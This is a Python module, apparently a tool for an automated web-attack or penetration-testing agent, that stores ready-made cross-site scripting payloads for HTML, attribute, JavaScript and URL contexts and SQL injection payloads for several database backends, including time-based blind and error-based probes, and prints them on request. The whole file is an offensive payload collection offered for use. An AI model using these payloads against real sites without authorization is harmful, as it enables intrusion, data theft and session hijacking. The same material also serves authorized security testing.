_XSS = {
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    "attr": [
        '" onmouseover="alert(1)" x="',
        "' onfocus=alert(1) autofocus x='",
        '" onload="alert(1)" x="',
    ],
    "js": [
        "';alert(1);//",
        "\\';alert(1);//",
        "-alert(1)//",
        "</script><script>alert(1)</script>",
    ],
    "url": ["%3Cscript%3Ealert(1)%3C/script%3E", "%22onerror%3Dalert(1)%3E"],
}
_SQLI = {
    "generic": [
        "' OR 1=1--",
        "' OR '1'='1",
        "1' ORDER BY 10--",
        "1 UNION SELECT NULL,NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
    ],
    "mysql": [
        "' OR SLEEP(5)--",
        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    ],
    "postgres": ["'; SELECT pg_sleep(5)--", "1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END)--"],
    "mssql": ["'; WAITFOR DELAY '0:0:5'--", "1' AND 1=(SELECT @@version)--"],
    "sqlite": ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000))))--"],
}


def xss_polyglots(context: str = "") -> str:
    ctx = (context or "").lower()
    if ctx and ctx not in _XSS:
        return f"Error: context {ctx!r} (one of {list(_XSS)})"
    chosen = {ctx: _XSS[ctx]} if ctx else _XSS
    out = []
    for ctx_name, payloads in chosen.items():
        out.append(f"[{ctx_name}]")
        out += [f"  {p}" for p in payloads]
    return "\n".join(out) + "\nPair with payloadescape for context-aware encoding."


def sqli_polyglots(backend: str = "") -> str:
    b = (backend or "generic").lower()
    if b not in _SQLI:
        return f"Error: backend {backend!r} (one of {list(_SQLI)})"
    out = [f"[{b}]"] + [f"  {p}" for p in _SQLI[b]]
    return "\n".join(out) + "\ncheck_knowledge first — the KG may already mark these blocked."
